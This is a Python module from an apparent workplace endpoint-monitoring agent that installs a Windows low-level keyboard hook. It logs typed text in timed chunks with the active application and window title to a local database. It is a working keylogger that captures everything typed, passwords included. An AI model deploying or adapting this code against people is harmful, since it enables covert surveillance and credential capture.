"""Keystroke capture module for EndpointClaw agent.

Installs a low-level keyboard hook (``WH_KEYBOARD_LL``) on Windows to
aggregate typed text into time-chunked records.  Only printable characters
are stored -- individual key events, modifier combos, and shortcuts are
**not** recorded.  Chunks are flushed to the local database every
*keystroke_chunk_seconds* (default 30 s).

On non-Windows platforms all methods are functional but do not capture
any data.
"""

from __future__ import annotations

import asyncio
import ctypes
import ctypes.wintypes
import logging
import platform
import threading
import time
from datetime import datetime, timezone
from typing import TYPE_CHECKING, Optional

if TYPE_CHECKING:
    from ..core.config import AgentConfig
    from ..core.database import Database

logger = logging.getLogger("endpointclaw.monitoring.keystrokes")

# ---------------------------------------------------------------------------
# Platform detection
# ---------------------------------------------------------------------------

_IS_WINDOWS = platform.system() == "Windows"

# ---------------------------------------------------------------------------
# Win32 constants
# ---------------------------------------------------------------------------

WH_KEYBOARD_LL = 13
WM_KEYDOWN = 0x0100
WM_SYSKEYDOWN = 0x0104
HC_ACTION = 0

# Virtual-key codes for special keys
VK_BACK = 0x08
VK_RETURN = 0x0D
VK_SPACE = 0x20
VK_TAB = 0x09

# ---------------------------------------------------------------------------
# Win32 structures
# ---------------------------------------------------------------------------

if _IS_WINDOWS:
    try:
        _user32 = ctypes.windll.user32  # type: ignore[attr-defined]
        _kernel32 = ctypes.windll.kernel32  # type: ignore[attr-defined]

        class _KBDLLHOOKSTRUCT(ctypes.Structure):
            _fields_ = [
                ("vkCode", ctypes.wintypes.DWORD),
                ("scanCode", ctypes.wintypes.DWORD),
                ("flags", ctypes.wintypes.DWORD),
                ("time", ctypes.wintypes.DWORD),
                ("dwExtraInfo", ctypes.POINTER(ctypes.c_ulong)),
            ]

        # Callback type: LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
        _HOOKPROC = ctypes.CFUNCTYPE(
            ctypes.c_long,
            ctypes.c_int,
            ctypes.wintypes.WPARAM,
            ctypes.wintypes.LPARAM,
        )

        _WIN32_READY = True
    except Exception:
        _WIN32_READY = False
        logger.warning("Failed to load Win32 DLLs for keyboard hook")
else:
    _WIN32_READY = False


# ---------------------------------------------------------------------------
# KeystrokeMonitor
# ---------------------------------------------------------------------------

class KeystrokeMonitor:
    """Aggregates typed text into time-chunked records via a Windows
    low-level keyboard hook.

    Each chunk stores:
    - ``chunk_start`` / ``chunk_end`` -- timestamps
    - ``text_content`` -- accumulated printable text
    - ``application`` -- foreground app at chunk start
    - ``window_title`` -- foreground window at chunk start
    - ``char_count`` -- number of characters

    On non-Windows platforms, ``start()`` logs a warning and all public
    methods are no-ops.
    """

    def __init__(self, config: AgentConfig, database: Database) -> None:
        self.config = config
        self.db = database

        self.paused: bool = False

        # Chunk timing
        self._chunk_seconds: int = getattr(config, "keystroke_chunk_seconds", 30)

        # Current chunk state (protected by _lock)
        self._lock = threading.Lock()
        self._chunk_text: list[str] = []
        self._chunk_start: Optional[float] = None
        self._chunk_app: str = ""
        self._chunk_title: str = ""

        # Hook state
        self._hook_handle: Optional[int] = None
        self._hook_thread: Optional[threading.Thread] = None
        self._running: bool = False

        # Flush timer
        self._flush_task: Optional[asyncio.Task] = None  # type: ignore[type-arg]

        # Keep a reference so the GC doesn't collect the callback
        self._hook_proc_ref: Optional[object] = None

        if not _IS_WINDOWS:
            logger.warning(
                "Keystroke monitoring requires Windows — running in no-op mode on %s",
                platform.system(),
            )

    # ------------------------------------------------------------------
    # Public API
    # ------------------------------------------------------------------

    def start(self) -> None:
        """Install the keyboard hook in a dedicated thread and begin the
        flush timer.
        """
        if not _WIN32_READY:
            logger.info("Keystroke monitor: no-op start (non-Windows)")
            return

        if self._running:
            return

        self._running = True

        # Start the hook thread (needs its own Windows message pump)
        self._hook_thread = threading.Thread(
            target=self._hook_thread_main,
            name="KeystrokeHookThread",
            daemon=True,
        )
        self._hook_thread.start()

        # Start the periodic flush timer on the asyncio loop
        try:
            loop = asyncio.get_event_loop()
            self._flush_task = loop.create_task(self._flush_loop())
        except RuntimeError:
            logger.debug("No running asyncio loop — flush timer not started")

        logger.info("Keystroke monitor started (chunk=%ds)", self._chunk_seconds)

    def stop(self) -> None:
        """Remove the keyboard hook and flush any pending chunk."""
        self._running = False

        # Cancel the flush timer
        if self._flush_task is not None:
            self._flush_task.cancel()
            self._flush_task = None

        # Unhook
        if _WIN32_READY and self._hook_handle is not None:
            try:
                _user32.UnhookWindowsHookEx(self._hook_handle)
                logger.debug("Keyboard hook removed")
            except Exception:
                logger.exception("Failed to remove keyboard hook")
            self._hook_handle = None

        # Post WM_QUIT to unblock GetMessageW in the hook thread
        if _WIN32_READY and self._hook_thread is not None and self._hook_thread.is_alive():
            try:
                thread_id = self._hook_thread.ident
                if thread_id:
                    _user32.PostThreadMessageW(thread_id, 0x0012, 0, 0)  # WM_QUIT
            except Exception:
                pass

        if self._hook_thread is not None:
            self._hook_thread.join(timeout=3)
            self._hook_thread = None

        # Flush remaining text
        self._flush_chunk_sync()
        logger.info("Keystroke monitor stopped")

    def pause(self) -> None:
        """Pause keystroke capture."""
        self.paused = True
        logger.info("Keystroke monitoring paused")

    def resume(self) -> None:
        """Resume keystroke capture."""
        self.paused = False
        logger.info("Keystroke monitoring resumed")

    # ------------------------------------------------------------------
    # Hook thread
    # ------------------------------------------------------------------

    def _hook_thread_main(self) -> None:
        """Entry point for the keyboard hook thread.

        Installs a ``WH_KEYBOARD_LL`` hook, then runs a Windows message
        pump (``GetMessageW``) until told to stop.
        """
        if not _WIN32_READY:
            return

        try:
            # Create the callback and prevent GC
            proc = _HOOKPROC(self._hook_callback)
            self._hook_proc_ref = proc

            self._hook_handle = _user32.SetWindowsHookExW(
                WH_KEYBOARD_LL,
                proc,
                _kernel32.GetModuleHandleW(None),
                0,
            )

            if not self._hook_handle:
                logger.error("SetWindowsHookExW failed — keystroke capture disabled")
                return

            logger.debug("Keyboard hook installed (handle=%s)", self._hook_handle)

            # Message pump — blocks until WM_QUIT
            msg = ctypes.wintypes.MSG()
            while self._running:
                result = _user32.GetMessageW(ctypes.byref(msg), None, 0, 0)
                if result == 0 or result == -1:
                    break
                _user32.TranslateMessage(ctypes.byref(msg))
                _user32.DispatchMessageW(ctypes.byref(msg))

        except Exception:
            logger.exception("Keyboard hook thread crashed")
        finally:
            if self._hook_handle:
                try:
                    _user32.UnhookWindowsHookEx(self._hook_handle)
                except Exception:
                    pass
                self._hook_handle = None

    # ------------------------------------------------------------------
    # Hook callback
    # ------------------------------------------------------------------

    def _hook_callback(
        self,
        n_code: int,
        w_param: int,
        l_param: int,
    ) -> int:
        """Low-level keyboard hook callback.

        Processes WM_KEYDOWN / WM_SYSKEYDOWN events and accumulates
        printable characters into the current chunk.
        """
        if not _WIN32_READY:
            return 0

        try:
            if n_code == HC_ACTION and w_param in (WM_KEYDOWN, WM_SYSKEYDOWN):
                if not self.paused:
                    kb = _KBDLLHOOKSTRUCT.from_address(l_param)
                    vk = kb.vkCode
                    self._process_key(vk)
        except Exception:
            # Never let an exception escape the hook callback
            pass

        # Always call the next hook
        try:
            return _user32.CallNextHookEx(self._hook_handle, n_code, w_param, l_param)
        except Exception:
            return 0

    def _process_key(self, vk_code: int) -> None:
        """Translate a virtual-key code into text and append to the chunk."""
        with self._lock:
            # Initialize chunk timing on first keystroke
            if self._chunk_start is None:
                self._chunk_start = time.time()
                # Capture foreground app at chunk start
                fg = self._get_foreground_info_sync()
                self._chunk_app = fg.get("app_name", "")
                self._chunk_title = fg.get("window_title", "")

            if vk_code == VK_BACK:
                # Backspace — remove last character
                if self._chunk_text:
                    self._chunk_text.pop()
            elif vk_code == VK_RETURN:
                self._chunk_text.append("\n")
            elif vk_code == VK_TAB:
                self._chunk_text.append("\t")
            elif vk_code == VK_SPACE:
                self._chunk_text.append(" ")
            elif 0x30 <= vk_code <= 0x5A:
                # 0-9, A-Z — convert to lowercase char (simplified;
                # does not handle Shift state or locale).
                self._chunk_text.append(chr(vk_code).lower())
            elif 0x60 <= vk_code <= 0x69:
                # Numpad 0-9
                self._chunk_text.append(str(vk_code - 0x60))
            elif vk_code in (0xBA, 0xBB, 0xBC, 0xBD, 0xBE, 0xBF, 0xC0, 0xDB, 0xDC, 0xDD, 0xDE):
                # Common punctuation keys (OEM keys) — map simplified
                _OEM_MAP = {
                    0xBA: ";", 0xBB: "=", 0xBC: ",", 0xBD: "-",
                    0xBE: ".", 0xBF: "/", 0xC0: "`", 0xDB: "[",
                    0xDC: "\\", 0xDD: "]", 0xDE: "'",
                }
                ch = _OEM_MAP.get(vk_code)
                if ch:
                    self._chunk_text.append(ch)
            # All other keys (Shift, Ctrl, Alt, function keys, etc.) are ignored

    # ------------------------------------------------------------------
    # Foreground info (sync, for use in the hook thread)
    # ------------------------------------------------------------------

    @staticmethod
    def _get_foreground_info_sync() -> dict:
        """Get the current foreground window info synchronously.

        Lightweight version for use inside the hook thread.
        """
        if not _WIN32_READY:
            return {"app_name": "", "window_title": ""}

        try:
            import psutil as _psutil

            hwnd = _user32.GetForegroundWindow()
            if not hwnd:
                return {"app_name": "", "window_title": ""}

            buf = ctypes.create_unicode_buffer(512)
            _user32.GetWindowTextW(hwnd, buf, 512)
            title = buf.value or ""

            pid = ctypes.wintypes.DWORD()
            _user32.GetWindowThreadProcessId(hwnd, ctypes.byref(pid))
            app_name = ""
            if pid.value:
                try:
                    app_name = _psutil.Process(pid.value).name()
                except (_psutil.NoSuchProcess, _psutil.AccessDenied):
                    app_name = "unknown"

            return {"app_name": app_name, "window_title": title}
        except Exception:
            return {"app_name": "", "window_title": ""}

    # ------------------------------------------------------------------
    # Chunk flushing
    # ------------------------------------------------------------------

    async def _flush_loop(self) -> None:
        """Periodically flush the accumulated chunk to the database."""
        while self._running:
            await asyncio.sleep(self._chunk_seconds)
            await self._flush_chunk()

    async def _flush_chunk(self) -> None:
        """Flush the current keystroke chunk to the database (async)."""
        record = self._build_chunk_record()
        if record is None:
            return

        try:
            await self.db.insert_keystroke_chunk(record)
            logger.debug(
                "Flushed keystroke chunk: %d chars, app=%s",
                record["char_count"],
                record["application"],
            )
        except Exception:
            logger.exception("Failed to flush keystroke chunk")

    def _flush_chunk_sync(self) -> None:
        """Synchronous flush — used during shutdown when no event loop may
        be running.
        """
        record = self._build_chunk_record()
        if record is None:
            return

        try:
            # Attempt to run the async insert; fall back to a warning
            loop = asyncio.get_event_loop()
            if loop.is_running():
                asyncio.ensure_future(self.db.insert_keystroke_chunk(record))
            else:
                loop.run_until_complete(self.db.insert_keystroke_chunk(record))
            logger.debug("Flushed final keystroke chunk on shutdown")
        except Exception:
            logger.warning(
                "Could not flush final keystroke chunk (%d chars)",
                record.get("char_count", 0),
            )

    def _build_chunk_record(self) -> Optional[dict]:
        """Extract the current chunk data and reset state.

        Returns None if there is nothing to flush.
        """
        with self._lock:
            if not self._chunk_text or self._chunk_start is None:
                return None

            text = "".join(self._chunk_text)
            record = {
                "chunk_start": datetime.fromtimestamp(
                    self._chunk_start, tz=timezone.utc
                ).isoformat(),
                "chunk_end": datetime.now(timezone.utc).isoformat(),
                "text_content": text,
                "application": self._chunk_app,
                "window_title": self._chunk_title,
                "char_count": len(text),
                "company_id": getattr(self.config, "company_id", "corvex"),
            }

            # Reset for the next chunk
            self._chunk_text = []
            self._chunk_start = None
            self._chunk_app = ""
            self._chunk_title = ""

        return record
